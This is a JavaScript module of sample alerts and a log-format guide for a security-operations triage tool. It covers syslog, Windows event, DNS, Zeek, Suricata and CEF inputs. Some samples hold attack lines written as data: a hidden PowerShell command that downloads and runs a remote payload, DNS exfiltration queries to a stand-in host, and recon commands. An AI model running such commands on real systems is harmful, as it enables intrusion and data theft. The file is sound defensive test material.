// Sample alerts and the input format guide for the Triage tab.
//
// Carried over from the standalone soc-triage-tool. The guide has been
// corrected where it promised more than the engine does: Zeek support is
// conn.log only, SIEM exports are read as free-form text, and the Windows
// example now uses the User: field the engine actually reads.

export const SAMPLE_ALERTS = [
  {
    id: 1,
    label: "Brute Force SSH",
    type: "Syslog",
    raw: `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:19 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:21 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:23 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:25 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:27 prod-server sshd[2341]: Failed password for admin from 185.220.101.45 port 52341 ssh2`
  },
  {
    id: 2,
    label: "Suspicious PowerShell",
    type: "Windows Event",
    raw: `EventID: 4104
TimeCreated: 2024-01-15T14:23:11Z
Computer: DESKTOP-A7K2P
User: CORP\\jsmith
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.200/payload.ps1')
CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand`
  },
  {
    id: 3,
    label: "DNS Exfiltration",
    type: "DNS Log",
    raw: `Timestamp: 2024-01-15T22:11:04Z
Source: 10.0.0.45
Query: aGVsbG93b3JsZA==.exfil.evilsite.xyz
Query: dGhpcyBpcyBhIHRlc3Q=.exfil.evilsite.xyz
Query: c2Vuc2l0aXZlZGF0YQ==.exfil.evilsite.xyz
Bytes_out: 48291
Unusual_subdomain_entropy: HIGH`
  },
  {
    id: 4,
    label: "Zeek C2 Beacon",
    type: "Zeek/Bro",
    raw: `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1705276800.123456 CRBfPk1234abcd 10.0.0.55 49201 203.0.113.99 4444 tcp - 3600.00 2457600 1024 SF
1705276801.234567 CRBfPk5678efgh 10.0.0.55 49202 203.0.113.99 4444 tcp - 3601.00 2457700 1025 SF`
  },
  {
    id: 5,
    label: "Cobalt Strike IDS",
    type: "Suricata",
    raw: `{
  "timestamp": "2024-01-15T10:33:21.123456+0000",
  "event_type": "alert",
  "src_ip": "10.0.0.22",
  "src_port": 54321,
  "dest_ip": "198.51.100.45",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2019401,
    "rev": 4,
    "signature": "ET MALWARE Possible Cobalt Strike Beacon Activity",
    "category": "Malware Command and Control Activity Detected",
    "severity": 1
  }
}`
  },
  {
    id: 6,
    label: "Firewall Block CEF",
    type: "CEF",
    raw: `CEF:0|Palo Alto Networks|PAN-OS|10.1|threat|THREAT|7|src=172.16.0.5 dst=203.0.113.10 spt=12345 dpt=80 proto=TCP act=block cs1=Mimikatz cs1Label=ThreatName deviceAction=block msg=Credential dumping tool detected rt=Jan 15 2024 08:22:11`
  }
];

export const FORMAT_GUIDE = [
  {
    name: "Syslog",
    pattern: "<Month> <Day> <Time> <host> <process>[<pid>]: <message>",
    example: "Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2",
    tips: "Standard Linux/Unix log format. Include multiple lines if they share a source IP or pattern. The more lines you include, the better the pattern detection."
  },
  {
    name: "Windows Event",
    pattern: "EventID: <id>\nTimeCreated: <ISO8601>\nComputer: <host>\nUser: <domain\\user>\n...",
    example: "EventID: 4625\nTimeCreated: 2024-01-15T14:23:11Z\nComputer: DESKTOP-A7K2P\nUser: CORP\\jsmith\nLogonType: 3",
    tips: "Export from Event Viewer as text or copy from SIEM. EventID is required. Include LogonType for authentication events."
  },
  {
    name: "Suricata / IDS",
    pattern: "JSON eve.log output or alert signature lines",
    example: '{"timestamp":"2024-01-15T10:33:21Z","event_type":"alert","src_ip":"10.0.0.22","dest_ip":"198.51.100.45","alert":{"signature":"ET MALWARE Cobalt Strike"}}',
    tips: "Paste the full JSON block from eve.log, or the raw alert line with signature name, src/dst IPs and ports."
  },
  {
    name: "Zeek / Bro",
    pattern: "conn.log TSV, ideally with its #fields header",
    example: "#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto duration orig_bytes\n1705276800.12 Cabc123 10.0.0.5 49201 203.0.113.9 4444 tcp 3600 2457600",
    tips: "Include the #fields header so columns are read by name; without it the standard conn.log order is assumed. Only conn.log fields (duration, bytes, destination port) are analysed, so dns.log and http.log rows are recognised but not scored."
  },
  {
    name: "CEF",
    pattern: "CEF:<ver>|<vendor>|<product>|<ver>|<sig>|<name>|<severity>|<extensions>",
    example: "CEF:0|Palo Alto|PAN-OS|10.1|threat|THREAT|7|src=10.0.0.1 dst=1.2.3.4 act=block msg=Mimikatz detected",
    tips: "Used by Palo Alto, ArcSight, and many SIEMs. Include full CEF line with extension fields for best results."
  },
  {
    name: "Splunk / SIEM Export",
    pattern: "Key: Value pairs or raw search result rows",
    example: "index=main sourcetype=sysmon EventCode=1\nImage=C:\\Windows\\System32\\cmd.exe\nCommandLine=cmd.exe /c whoami\nParentImage=explorer.exe",
    tips: "There is no dedicated SIEM-export parser: key=value exports are analysed as free-form text. A Windows event is recognised as one only when it includes an EventID: line."
  },
  {
    name: "Free-form",
    pattern: "Plain English description with technical indicators included",
    example: "User jsmith logged in from 185.220.101.45 at 3am, ran whoami and net user /domain, then accessed \\\\DC01\\SYSVOL and downloaded ~500MB.",
    tips: "Works but produces lower confidence. Always include IPs, usernames, hostnames, commands, and timestamps when describing an incident."
  }
];
